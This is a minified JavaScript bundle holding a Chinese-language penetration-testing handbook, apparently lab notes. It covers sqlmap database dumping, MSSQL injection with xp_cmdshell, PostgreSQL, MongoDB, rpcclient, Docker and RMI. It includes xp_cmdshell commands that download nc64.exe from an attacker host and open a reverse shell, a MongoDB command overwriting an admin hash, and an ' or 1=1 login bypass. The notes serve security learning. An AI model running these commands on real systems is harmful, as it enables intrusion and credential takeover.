                `))},{name:"\u6570\u636E\u9636\u6BB5\u9009\u9879    \u3010\u7206\u6570\u636E\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("	\u6570\u636E\u9636\u6BB5\u9009\u9879\uFF1A|","		1.\u3010-D  <\u6570\u636E\u5E93\u540D\u79F0>  --tables  \u3011\uFF0C\u5728 \u6570\u636E\u5E93 \u4E2D \u731C\u8868","		2.\u3010-D  <\u6570\u636E\u5E93\u540D\u79F0>  -T  <\u8868\u540D>  --columns  \u3011\uFF0C\u5728 \u8868 \u4E2D \u731C\u5217",'		3.\u3010-D  <\u6570\u636E\u5E93\u540D\u79F0>  -T  <\u8868\u540D>  -C  "<\u5217\u540D\u591A\u4E2A\u7528\u9017\u53F7\u5206\u9694>"  --dump  \u3011\uFF0C\u5728 \u5217 \u4E2D \u731C\u6570\u636E',"		1.\u3010\u6D41\u7A0B\u3011","			\u7206\u5E93\uFF1A    \u3010-u  <url>  --dbs\u3011","			\u7206\u8868\uFF1A    \u3010-u  <url>  -D  <\u5E93\u540D>  --tables  --batch  --threads 10\u3011","			\u7206\u5B57\u6BB5\uFF1A  \u3010-u  <url>  -D  <\u5E93\u540D>  -T  <\u8868\u540D>  --columns  --batch  --threads 10\u3011","			\u7206\u503C\uFF1A    \u3010-u  <url>  -D  <\u5E93\u540D>  -T  <\u8868\u540D>   -C  <\u5217\u540D\uFF0C\u53EF\u591A\u4E2A\uFF0C\u9017\u53F7\u5206\u9694>  --dump  --batch  --threads 10\u3011"))}]},{name:"\u3010mssql\u3011 / \u3010sqlserver\u3011\u539F\u751F",desc:e.a.createElement(e.a.Fragment,null),steps:[{name:"\u5E38\u89C1\u547D\u4EE4",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          \u8D44\u6599\uFF1Ahttps://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
              \u6CE8\u610F\uFF0C\u5728\u8FD9\u4E2A\u6587\u6863\u4E2D \u6240\u6709\u3010\u2014\u3011\u90FD\u66FF\u6362\u4E3A\u3010--\u3011


          \u547D\u4EE4\u6267\u884C
              \u6267\u884Ccmd\u547D\u4EE4\uFF1A
                  EXEC xp_cmdshell \u2018net user\u2019;                  -- privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it\u2019s disabled by default:

              \u8BBE\u7F6E\uFF1A
                  \u5217\u4E3E\u8BBE\u7F6E\uFF1A
                      EXEC sp_configure;                            -- priv

                  \u67E5\u770B\u5355\u4E2A\u8BBE\u7F6E\uFF1A
                      EXEC sp_configure \u2018show advanced options\u2019;    -- priv

                  \u8FDB\u884C\u5355\u4E2A\u8BBE\u7F6E\uFF1A\uFF08\u540E\u7EED\u9700\u8981 RECONFIGURE \u624D\u80FD\u751F\u6548\uFF09
                      EXEC sp_configure \u2018show advanced options\u2019, 1; -- priv

                  \u4F7F\u3010\u914D\u7F6E\u3011\u9A6C\u4E0A\u751F\u6548\uFF1A
                      RECONFIGURE;

              RECONFIGURE;                                  -- priv
              EXEC sp_configure \u2018xp_cmdshell\u2019, 1;           -- priv
              RECONFIGURE;                                  -- priv



          \u67E5\u770B\u3010\u7248\u672C\u3011
              SELECT @@version

          \u6CE8\u91CA
              \u3010--\u3011
              \u3010/*comment*/\u3011

          \u5F53\u524D\u3010\u7528\u6237\u3011
              SELECT user_name();
              SELECT system_user;
              SELECT user;
              SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID ;

          \u5217\u4E3E\u3010\u7528\u6237\u3011
              SELECT name FROM master..syslogins ;

          \u5217\u4E3E\u3010\u5BC6\u7801Hash\u3011
              SELECT name, password FROM master..sysxlogins -- priv, mssql 2000;
                  \u9700\u8981\u3010members of sysadmins\u3011\u624D\u80FD\u8BBF\u95EE\u3010sysxlogins\u3011\u3002\u6CE8\u610F\u8FD9\u70B9\u3002

              \u4EE5\u53CA\u53E6\u5916 3 \u6761\u3002

          \u5BC6\u7801\u7834\u89E3
              MSSQL 2000 \u548C 2005 Hashes \u90FD\u662F\u57FA\u4E8E\u3010SHA1-based\u3011
              phrasen|drescher \u80FD\u591F\u7834\u89E3\u4ED6\u4EEC\u3002

          \u68C0\u67E5\u3010\u7528\u6237\u6743\u9650\u3011
              SELECT is_srvrolemember('sysadmin');        -- \u662F\u5426\u3010sysadmin\u3011\u8EAB\u4EFD

          \u5217\u4E3E\u3010\u6743\u9650\u3011
              SELECT permission_name FROM master..fn_my_permissions(null, \u2018DATABASE\u2019);              -- current database
              SELECT permission_name FROM master..fn_my_permissions(null, \u2018SERVER\u2019);                -- current server
              SELECT permission_name FROM master..fn_my_permissions(\u2018master..syslogins\u2019, \u2018OBJECT\u2019); -- permissions on a table
              SELECT permission_name FROM master..fn_my_permissions(\u2018sa\u2019, \u2018USER\u2019);

              \u4EE5\u53CA\u53E6\u5916 8 \u6761\u3002

              \u4EE5\u53CA\u53E6\u5916 12 \u6761\u3002

          \u5217\u4E3E\u3010DBA\u8D26\u6237\u3011 Database Admin \u6570\u636E\u5E93\u7BA1\u7406\u5458

          \u5F53\u524D\u3010\u6570\u636E\u5E93\u3011
              SELECT DB_NAME()

          \u5217\u4E3E\u3010\u6570\u636E\u5E93\u3011
              SELECT name FROM master..sysdatabases;
              SELECT DB_NAME(N); -- for N = 0, 1, 2, \u2026

          \u5217\u4E3E\u3010\u5217\u3011

          \u5217\u4E3E\u3010\u8868\u3011

          \u4ECE\u3010\u8868\u3011\u4E2D\u627E\u51FA\u3010\u5217\u540D\u3011

          \u9009\u62E9\u3010\u7B2CN\u884C\u3011

          \u9009\u62E9\u3010\u7B2CN\u4E2A\u5B57\u7B26\u3011

          \u4F4D\u4E0E Bitwise AND

          \u3010ASCII\u503C\u3011\u5230\u3010\u5B57\u7B26\u3011

          \u3010\u5B57\u7B26\u3011\u5230\u3010ASCII\u503C\u3011

          \u8F6C\u5316 Casting

          \u3010\u5B57\u7B26\u4E32\u3011\u62FC\u63A5\u3001\u7EA7\u8054

          \u3010If\u3011\u8868\u8FBE\u5F0F

          \u3010Case\u3011\u8868\u8FBE\u5F0F

          \u907F\u514D\u3010\u5F15\u53F7\u3011 Avoiding Quotes

          \u3010\u65F6\u95F4\u5EF6\u8FDF\u3011 Time Delay

          \u53D1\u9001\u3010DNS\u3011\u8BF7\u6C42



          \u672C\u5730\u6587\u4EF6\u8BBF\u95EE Local File Access

          \u4E3B\u673A\u540D\u3001IP\u5730\u5740\uFF0CHostname  IP

          \u521B\u5EFA\u3010\u7528\u6237\u3011

          \u5220\u9664\u3010\u7528\u6237\u3011    Drop Users

          \u8BBE\u7F6E\u3010DBA\u7528\u6237\u3011 Make User DBA

          \u3010\u6570\u636E\u5E93\u6587\u4EF6\u3011\u4F4D\u7F6E       Location of DB files

          \u3010\u9ED8\u8BA4\u6570\u636E\u5E93/\u7CFB\u7EDF\u6570\u636E\u5E93\u3011 Default/System Databases



          `))},{name:"\u4E00\u4E9B\u5B9E\u6218\u793A\u4F8B",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

  xp_cmdshell  "powershell  -c  cd  C:\\Users\\sql_svc\\Downloads;  wget  http://10.10.14.56:8080/nc64.exe  -outfile  nc64.exe  "
      \u3010IP\u5730\u5740\u3011\uFF0C\u662F\u3010ifconfig\u3011\u7684\u3010tun0\u63A5\u53E3\u3011\u7684 IP \u3002


  xp_cmdshell  "powershell  -c  cd  C:\\Users\\sql_svc\\Downloads;  .\\nc64.exe  -e  cmd.exe  10.10.14.56  443  "
      \u3010IP\u5730\u5740\u3011\uFF0C\u540C\u4E0A\u3002

              `))}]},{name:"\u3010mssqlclient\u3011 / \u3010mssqlclient.py\u3011",desc:e.a.createElement(e.a.Fragment,null),content:Promise.all([Promise.resolve().then(n.bind(null,"2jYT"))]).then(function(Xu){var $u=Object(y.a)(Xu,1),ne=$u[0];return e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(ne.Impacket_\u5957\u4EF6_Helper["mssqlclient.py"]))})},{name:"\u3010PostgreSQL\u3011\u539F\u751F",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,e.a.createElement(qu.b,{special_name:"PostGreSQL",var_names_arr:["ip_\u57FA\u4E8E\u53D7\u5BB3\u673A\u5668\u7684\u89C6\u89D2_\u5982localhost","port_\u53D7\u5BB3\u673A\u5668_\u5185\u90E8\u6240\u6301\u6709\u7684_\u9700\u8981\u8F6C\u53D1\u7684\u90A3\u4E2A","user_\u53D7\u5BB3\u673A\u5668","db_name"],code_template_arr:["psql  -h ###<ip_\u57FA\u4E8E\u53D7\u5BB3\u673A\u5668\u7684\u89C6\u89D2_\u5982localhost>###  -p ###<port_\u53D7\u5BB3\u673A\u5668_\u5185\u90E8\u6240\u6301\u6709\u7684_\u9700\u8981\u8F6C\u53D1\u7684\u90A3\u4E2A>###   -U ###<user_\u53D7\u5BB3\u673A\u5668>###      -d ###<db_name>###     ","psql  -h ###<ip_\u57FA\u4E8E\u53D7\u5BB3\u673A\u5668\u7684\u89C6\u89D2_\u5982localhost>###  -p ###<port_\u53D7\u5BB3\u673A\u5668_\u5185\u90E8\u6240\u6301\u6709\u7684_\u9700\u8981\u8F6C\u53D1\u7684\u90A3\u4E2A>###   -U ###<user_\u53D7\u5BB3\u673A\u5668>###"]}),F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8D44\u6599\uFF1A
              \u4E00\u4E9B\uFF1Ahttps://www.cnblogs.com/my-blogs-for-everone/p/10226473.html

          \u8FD0\u884C
              \u4F7F\u7528\u4E00\u6B3E\u547D\u4EE4\u884C\u5DE5\u5177\uFF0C\u53EB\u3010psql\u3011\u3002
                  \u5982\u679C\u4F60\u3010apt install psql\u3011\u627E\u4E0D\u5230\uFF0C\u5219\u662F\u56E0\u4E3A\u3010kali\u3011\u5DF2\u7ECF\u5185\u7F6E\u88C5\u4E86  \u76F8\u5173\u670D\u52A1\uFF1A
                      \uFF08\u8D44\u6599\uFF1Ahttps://blog.csdn.net/qq_34965596/article/details/113830408\uFF09

                      service  postgresql  start
                          \u7136\u540E\u8F93\u5165\u3010psql\u3011\uFF0C\u5C31\u5B58\u5728\u8FD9\u4E2A\u547D\u4EE4\u884C\u4E86
          \u547D\u4EE4

              \u767B\u9646\u6570\u636E\u5E93
                  psql  -U  <user_\u53D7\u5BB3\u673A\u5668>  -h  <ip_\u57FA\u4E8E\u53D7\u5BB3\u673A\u5668\u7684\u89C6\u89D2_\u5982localhost>  -p  <port_\u53D7\u5BB3\u673A\u5668_\u5185\u90E8\u6240\u6301\u6709\u7684_\u9700\u8981\u8F6C\u53D1\u7684\u90A3\u4E2A>
                  psql  -U  postgres        -h 127.0.0.1                         -p 5432                        -d postgres

              \u4FEE\u6539\u767B\u9646\u5BC6\u7801\uFF0C\u4FEE\u6539\u7528\u6237 postgres \u7684\u5BC6\u7801\u4E3A 123456
                  ALTER USER postgres WITH PASSWORD '123456';

              \u521B\u5EFA\u65B0\u7528\u6237\uFF0C\u7528\u6237\u540D\u4E3A postgres \uFF0C\u5BC6\u7801\u4E3A 123456
                  CREATE USER postgres WITH PASSWORD '123456' NOCREATEDB;

              \u521B\u5EFA\u6570\u636E\u5E93\uFF0C\u4E3A\u7528\u6237 postgres \u521B\u5EFA\u6570\u636E\u5E93 dbname
                  CREATE DATABASE dbname OWNER postgres;

              \u5217\u51FA\uFF0C\u6240\u6709\u6570\u636E\u5E93
                  \\l

              \u5217\u51FA\uFF0C\u5F53\u524D\u8FDE\u63A5  \u6240\u4F7F\u7528\u7684\u7528\u6237\u3001\u6570\u636E\u5E93\u3001IP\u3001\u7AEF\u53E3\u3001\u8FDE\u63A5\u8BE6\u60C5\u3001  \u7B49\u4FE1\u606F
                  \\conninfo

              \u8FDE\u63A5\u5230\uFF0C\u67D0\u4E00\u6570\u636E\u5E93
                  \\c  <\u6570\u636E\u5E93\u7684\u540D\u5B57>

              \u5217\u51FA\uFF0C\u5F53\u524D\u6570\u636E\u5E93\u4E0B\uFF0C\u6240\u6709\u7684\u8868\u683C
                  \\dt

                      \u5728\u3010\u8868\u683C\u3011\u4E2D\uFF0C\u67E5\u8BE2\u6240\u6709  \u884C\u6570\u636E\uFF1A
                              SELECT * FROM <\u8868\u540D> ;


              \uFF08\u8FD9\u4E2A\u65E0\u6548\uFF0C\u53EA\u80FD  \u5148\u8FDE\u63A5\uFF0C\u518D\u3010\\dt\u3011\u770B\u81EA\u8EAB\uFF09
                      \u5217\u51FA\uFF0C\u67D0\u4E2A\u6570\u636E\u5E93\u4E0B\uFF0C\u6240\u6709\u7684\u8868\u683C
                          \\dt <\u6570\u636E\u5E93\u7684\u540D\u5B57>

              \u5217\u51FA\uFF0C\u6307\u5B9A\u7684\u67D0\u4E00\u5F20\u8868  \u7684\u7ED3\u6784
                  \\d <\u6570\u636E\u8868\u7684\u540D\u5B57>

              \u5217\u51FA\uFF0C\u6240\u6709\u7528\u6237
                  \\du

              \u6253\u5F00  \u6587\u672C\u7F16\u8F91\u5668
                  \\e

              \u663E\u793A\uFF0C\u5B57\u7B26\u96C6
                  \\encoding



          `))},{name:"\u3010Mongo\u3011/\u3010MongoDB\u3011\u539F\u751F",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              mongo

                  MongoDB \u662F\u4E00\u4E2A\u6E90\u4EE3\u7801\u53EF\u7528\u7684\u8DE8\u5E73\u53F0\u9762\u5411\u6587\u6863\u7684\u6570\u636E\u5E93\u7A0B\u5E8F\u3002
                  MongoDB \u88AB\u5F52\u7C7B\u4E3A NoSQL \u6570\u636E\u5E93\u7A0B\u5E8F\uFF0C\u5B83\u4F7F\u7528\u5E26\u6709\u53EF\u9009\u6A21\u5F0F\u7684\u7C7B\u4F3C JSON \u7684\u6587\u6863\u3002


              \u767B\u5F55

                      \u3010\u6570\u636E\u5E93\u540D\u3011\uFF0C\u5728\u3010UniFi Network\u3011\u4E2D\u9ED8\u8BA4\u662F\u3010ace\u3011

                      mongo  <IP\u5730\u5740>
                              \u65E0\u5BC6\u7801\u767B\u5F55
                      mongo  foo
                              \u8FDE\u63A5\uFF0C\u672C\u5730\u3010foo\u6570\u636E\u5E93\u3011
                      mongo  192.168.0.5/foo
                      mongo  192.168.0.5:9999/foo
                      mongo  mongodb://192.168.0.5:9999/foo
                              \u4F7F\u7528\u3010Mongo\u534F\u8BAE\u3011\u7684\u65B9\u5F0F\u3002


              \u67E5\u770B\u6570\u636E

                      mongo  dbs
                      use    <\u6570\u636E\u5E93\u540D\u79F0>
                      show  collections
                              \u5728(\u9009\u4E86)\u67D0\u4E2A\u6570\u636E\u5E93\u5185

                      db.<\u96C6\u5408\u540D\u79F0>.find()
                      db.<\u96C6\u5408\u540D\u79F0>.find().pretty()
                              \u5728(\u5DF2\u8FDB\u5165\u7684)\u6570\u636E\u5E93\u5185\uFF0C\u6253\u5370\u3010\u6307\u5B9A\u96C6\u5408\u3011\u7684\u5168\u90E8\u5143\u7D20
                                  \u8D44\u6599\uFF1Ahttps://stackoverflow.com/a/29778560/6264260

                      db.getCollectionNames().map( (name) => ({[name]: db[name].find().toArray().length}) )
                              \u67E5\u8BE2\u6240\u6709\u6709\u6548\u6570\u636E\uFF0C\u4E2A\u6570\u548C\u957F\u5EA6\u3002
                                  \u8D44\u6599\uFF1Ahttps://stackoverflow.com/a/57176568/6264260

                      db.getCollectionNames().forEach(c => {  db[c].find().forEach(d => {  print(c);printjson(d)  })})
                              \u67E5\u8BE2\u6240\u6709\u6570\u636E\u3002
                                  \u8D44\u6599\uFF1Ahttps://stackoverflow.com/a/55595557/6264260

              \u6267\u884C

                  \u9996\u5148\uFF0C\u53EF\u4EE5\u53C2\u7167\u3010\u6211\u7684\u7B14\u8BB0\u3011\u4E2D\uFF0Cmongo\u7684\u6B63\u786E\u67E5\u8BE2

                  \u67E5\u770B\u4FE1\u606F\uFF1A
                      mongo  <\u6570\u636E\u5E93\u5168\u79F0_\u5305\u62ECIP\u7B49>  --port  27117  --eval  "db.admin.find().forEach(printjson);"

                  \u4FEE\u6539\u4FE1\u606F\uFF1A
                      mongo  <\u6570\u636E\u5E93\u5168\u79F0_\u5305\u62ECIP\u7B49>  --port  27117  --eval  'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"<\u521A\u521A\u751F\u6210\u7684hash\u503C>"}})'


              \u5E38\u89C1\u9009\u9879

                  \u3010--port\u3011\uFF0C\u6307\u5B9A\u7AEF\u53E3

                  \u3010--eval\u3011\uFF0C\u6267\u884C\u547D\u4EE4


          `))},{name:"\u540E\u7EED\u5229\u7528",desc:e.a.createElement(e.a.Fragment,null),steps:[{name:"\u83B7\u5F97shell",desc:e.a.createElement(e.a.Fragment,null),content:Promise.all([Promise.resolve().then(n.bind(null,"2jYT"))]).then(function(Xu){var $u=Object(y.a)(Xu,1),ne=$u[0];return e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(Object(u.d)({\u667A\u80FD\u6B65\u9AA4_cfg:ne.Shell_ReverseShell_\u53CD\u5411\u4EE3\u7406_\u624B\u518C})),F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


              \u7528sqlmap\uFF0C\u83B7\u53D6\u3010os-shell\u3011


                    `,Wu))})},{name:"\u3010\u4E07\u80FD\u5BC6\u7801\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u5E26\u6CE8\u91CA
                  \u3010' #\u3011
                  \u3010' ---\u3011

              \u6216\u6761\u4EF6
                  \u3010' or 1=1\u3011

              `))},{name:"\u4E0A\u4F20\u6587\u4EF6",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"\u62D6\u53D6\u4FE1\u606F",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"\u6267\u884C\u547D\u4EE4",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())}]}]},Fu=U,ru=g.l.singleATag_blank,Eu={name:"\u3010BurpSuite\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4F7F\u7528",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u57FA\u672C\u529F\u80FD

              \u62E6\u622A          \u3010Proxy\u3011

              \u7F16\u7801/\u89E3\u7801      \u3010Decoder\u3011
                  \u5176\u5B9E\uFF0C\u65E2\u53EF\u4EE5Encode\uFF0C\u4E5F\u53EF\u4EE5Decode\u3002
                      Encode as
                          \u4E0D\u540C\u7684\u989C\u8272\uFF0C\u5373\u53EF\u3002


              \u91CD\u590D\u8BF7\u6C42        \u3010Repeater\u3011
                  \u53F3\u4FA7\uFF0C\u65B9\u4FBF\u7F16\u7801

          `))}]},eu=Eu,su=n("qtNK"),gu=n("XjqV"),Yu=n("9z6I"),Ee=g.l.singleATag_blank,Hu={name:"\u3010XSS\u3011_\u624B\u518C",steps:[{name:"\u539F\u7406",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"\u5E38\u89C1\u8BED\u53E5\u3001\u3010WAF\u3011\u3010\u7ED5\u8FC7\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,e.a.createElement("h1",null,"\u5982\u679C\uFF0C\u4F1A\u88AB\u3010\u6BCF30\u79D2\u63D0\u9192\u3011\u6253\u65AD\uFF0C\u5219\u5173\u95ED\u3010\u4EBA\u751F\u4EFB\u52A1\u3011\u5373\u53EF\uFF01\u3002"),e.a.createElement(Yu.a,null),F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"XSS\u3010\u76F2\u6253\u540E\u53F0\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())}]},Su=Hu,oe=g.l.singleATag_blank,re={name:"\u3010Docker\u3011_\u504F\u6E17\u900F\u65B9\u5411_\u624B\u518C",steps:[{name:"\u5E38\u89C1\u547D\u4EE4",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u955C\u50CF
              docker  image

              \u67E5\u770B
                  docker  image  list  -a

          \u5BB9\u5668
              docker  container

              \u67E5\u770B
                  docker  container  list  -a

                  \u542F\u52A8\u3001\u505C\u6B62\u3001\u5220\u9664

          \u62C9\u53D6
              docker  pull  <\u4ED3\u5E93\u540D/\u955C\u50CF\u540D:\u7248\u672C\u540D>

          \u542F\u52A8
              \u542F\u52A8\u5B9D\u5854
                  docker run -d --restart unless-stopped --name baota -p 8888:8888 -p 22:22 -p 443:443 -p 80:80 -p 888:888 -v ~/baota/website_data:/www/wwwroot -v ~/baota/mysql_data:/www/server/data -v ~/baota/vhost:/www/server/panel/vhost btpanel/baota:lnmp

          \u8FD0\u884C\u547D\u4EE4
              docker exec -it <\u5BB9\u5668id> bash

          \u5E38\u89C1\u9009\u9879
              \u3010--restart  unless-stopped\u3011
                  \u91CD\u542Fdocker\u540E\u81EA\u542F\u5BB9\u5668

              \u3010--name  <\u81EA\u5B9A\u4E49\u5BB9\u5668\u540D>\u3011
                  \u5728\u542F\u52A8\u65F6\uFF0C\u81EA\u5B9A\u4E49\u547D\u540D \u8BE5container\u5BB9\u5668 \u3002

              \u3010-p  <\u771F\u673A\u7AEF\u53E3>:<\u5BB9\u5668\u5185\u7AEF\u53E3>\u3011
                  \u6307\u5B9A  \u5916\u90E8\u5230\u5185\u90E8  \u7AEF\u53E3\u6620\u5C04\u3002

              \u3010-v  <\u771F\u673A\u76EE\u5F55>:<\u5BB9\u5668\u5185\u76EE\u5F55>\u3011
                  \u6307\u5B9A  \u5916\u90E8\u5230\u5185\u90E8  \u76EE\u5F55\u6620\u5C04\u3002

              \u3010--net=host\u3011
                  \uFF1F\uFF1F\uFF1F

          `))},{name:"\u914D\u7F6E\u6587\u4EF6",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4ECB\u7ECD
              \u5728\u521B\u5EFA\u5BB9\u5668\u540E\uFF0C\u8981\u4FEE\u6539\u3010\u5DF2\u6709\u914D\u7F6E\u3011
                  \u8D44\u6599\uFF1Ahttps://blog.51cto.com/u_12020737/2838531

                  \u65B9\u6CD5\u4E00\uFF0C\u5220\u9664\u5BB9\u5668\uFF0C\u91CD\u65B0\u521B\u5EFA\u3002  \uFF08\u4E0D\u63A8\u8350\uFF09

                  \u65B9\u6CD5\u4E8C\uFF0C\u4FEE\u6539\u3010/var/lib/docker/containers/\u5BB9\u5668/config.v2.json\u3011\u6587\u4EF6

                      \u5207\u8BB0\uFF0C\u4FEE\u6539\u5B8C\u540E\uFF0C\u8981\u3010\u91CD\u542FDocker\u670D\u52A1\u3011\u3002
                          1. \u53C2\u8003\u8D44\u6599\uFF1A  https://serverfault.com/a/935855/550538
                          2. \u3010systemctl  restart  docker\u3011\u3002

                      \u4FEE\u6539\u3010MountPoints\u3011\u540E\uFF0C\u8981\u6CE8\u610F\u7684\u4E8B\u60C5
                          \u5728\u7B2C\u4E00\u6B21\u542F\u52A8\u540E\uFF0CDocker\u5185\u7684\u3010\u6587\u4EF6\u6570\u636E\u3011\uFF0C\u4F1A\u88AB\u3010\u771F\u673A\u3011\u7684\u3010\u540C\u540D\u6587\u4EF6\u5939\u3011\u5B8C\u5168\u8986\u76D6\uFF01\uFF01\uFF01
                              \u6240\u4EE5\uFF0C\u4F60\u662F\u53EF\u80FD\u4F1A\u4E22\u6570\u636E\u7684\uFF01
                          \u5207\u8BB0\u505A\u4E00\u4E2A\u5907\u4EFD\uFF01

          `))}]},se=re,Uu=g.l.singleATag_blank,A={name:"\u3010RPC\u3011_\u624B\u518C",steps:[{name:"\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`



          `))},{name:"\u3010msrpc\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

         `))},{name:"\u3010RpcClient\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          rpcclient  -U  <\u7528\u6237\u540D>  <IP\u5730\u5740>


          \u5B50\u547D\u4EE4\uFF1A
              enumdomusers


              lookupnames  <\u7528\u6237\u540D>
              lookupnames  <SID>
                  \u3010SID\u3011\u8868\u8FBE\u65B9\u5F0F

                      S-1-5-21-4254423774-1266059056-3197185112-500
                          \u300AS-1-5\u300B \uFF0C \u8FD9\u5B9A\u4E49\u4E86\u6807\u8BC6\u7B26\u6388\u6743
                          \u300A21\u20134254423774\u20131266059056\u20133197185112\u300B \uFF0C \u8FD9\u662F\u7279\u5B9A\u4E8E\u57DF\u7684\u6807\u8BC6\u7B26
                          \u300A500\u300B \uFF0C \u6807\u8BC6\u7528\u6237\uFF08\u7BA1\u7406\u5458\u9ED8\u8BA4\u4E3A 500 \uFF09

                      \u53EF\u4EE5\u4E0D\u65AD\u7684\u3010\u679A\u4E3E\u3011\u6700\u540E\u4E00\u4F4D\uFF0C\u6765\u679A\u4E3E \u6240\u6709\u7684\u7528\u6237\u5217\u8868

                      \u3010RID\u3011(Relative Identifier)\uFF0C
                          \u662F\u3010SID\u3011\u7684\u4E00\u90E8\u5206\u3002\u7528\u4E8E\u5728\u3010Windows\u4E3B\u673A\u3011\u4E0A\uFF0C\u552F\u4E00\u6807\u8BC6\u3010\u7528\u6237\u3011\u6216\u3010\u670D\u52A1\u3011\u3002
                              \u672C\u5730RID\u3001\u6216 Domain\u57DF\u540DRID\uFF0C\u603B\u4F1A\u662F\u3010\u4E00\u53F0\u8BA1\u7B97\u673A\u3011\u3002


          `))}]},W={name:"\u3010RMI\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u540D\u79F0\uFF1A
              Java\u8FDC\u7A0B\u65B9\u6CD5\u8C03\u7528\uFF0CJRMI
                  \u5168\u79F0\uFF1A(Java remote method invocation)

          \u4ECB\u7ECD\uFF1A
              \u8D44\u6599\uFF1A
                  https://wooyun.js.org/drops/java%20RMI%E7%9B%B8%E5%85%B3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E5%90%88%E5%88%86%E6%9E%90.html
                  https://www.freebuf.com/vuls/324584.html

              \u662F\u7531JDK\u81EA\u5E26\u63D0\u4F9B\u7684\u4E00\u5957\u8FDC\u7A0B\u65B9\u6CD5\u8C03\u7528\u6846\u67B6\uFF0C\u7528\u4E8E\u5B9E\u73B0\u3010\u8DE8JVM\u3011\u95F4\u7684\u65B9\u6CD5\u8C03\u7528\u3002
                  \u5176\u6574\u4F53\u67B6\u6784\u4E0E\u5E38\u89C1\u7684\u3010RPC\u3011\u6846\u67B6\u7C7B\u4F3C\u3002

                  \u91CD\u70B9\uFF1A
                      \u8DE8\u8D8A\u591A\u4E2A\u3010JVM\u3011\u3002\u8FD9\u4F3C\u4E4E\u662F\u8F83\u5E38\u89C1\u7684\u9700\u6C42\uFF1F

          \u76F8\u5173\u6F0F\u6D1E\uFF1A
              \u3010\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u3011
                  \u5728java\u4F7F\u7528RMI\u673A\u5236\u65F6\uFF0C\u4F1A\u4F7F\u7528\u5E8F\u5217\u5316\u5BF9\u8C61\u8FDB\u884C\u6570\u636E\u4F20\u8F93\u3002\u8FD9\u5C31\u4F1A\u4EA7\u751F\u3010Java\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u3011\u3002\u5229\u7528\u8303\u56F4\u662F\u5F88\u5927\u3002
              \u76F8\u5173\u4E2D\u95F4\u4EF6\uFF1A
                  JBoss RMI\u653B\u51FB\u5229\u7528
